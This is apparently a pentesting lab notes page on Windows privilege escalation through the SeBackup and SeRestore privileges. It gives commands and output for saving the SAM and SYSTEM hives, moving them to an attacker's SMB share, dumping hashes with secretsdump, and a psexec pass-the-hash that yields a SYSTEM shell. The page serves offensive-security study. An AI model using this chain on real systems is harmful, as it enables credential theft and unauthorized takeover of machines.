---
sidebar_position: 1
title: SeBackup - SeRestore
---


**`SeBackup`** and **`SeRestore`** Privileges allow Users to **Read - Write** to any File in the System, Ignoring any **`DACL`** in place.  The idea behind this Privilege is to Allow certain Users to perform **BackUP's** from a System **(Without Requiring full Administrative Privileges).**

- **[METHOD]** Copying the `SAM` and `SYSTEM` Registry Hives to extract the local Administrator's Password HASH.

---

<br/>



- This Account is part of the **`Backup Operators` Group** which by default is granted the <b style={{ color: 'Brown' }}>[SeBackup - SeRestore]</b> Privileges.
- <b style={{ color: 'Red' }}>[NOTE]</b> The <span style={{fontWeight: 'Bold'}}>Command Prompt</span> needs to be open as <b style={{ color: 'Red' }}>Administrator</b> 

```log
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
// highlight-start
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
// highlight-end
```

<br/>

### Hashes


- BackUP `SAM` and `SYSTEM` Hashes.

```log
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
```

<br/>

- Copying the Files to the **Attacker Machine** using a **Python** `SMB` Server.

```bash
attacker@machine:~$ smbserver $SHARE_NAME $DIRECTORY  
```

<br/>

- Using <b style={{ color: 'Coral' }}>secretsdump</b> to Retrieve the User Password Hashes.

```log
attacker@machine:~$ secretsdump.py -sam sam.hive -system system.hive LOCAL

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

<br/>

### Pass-the-Hash

- Using <b style={{ color: 'Coral' }}>psexec</b> to perform the Attack.
- Using the **`Administrator`** **HASH** to perform a <b style={{ color: 'HotPink' }}>Pass-the-Hash</b> Attack and gain Access to the Target Machine with <b style={{ color: 'Red' }}>SYSTEM</b> Privileges.


```log
attacker@machine:~$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
NT AUTHORITY\SYSTEM
```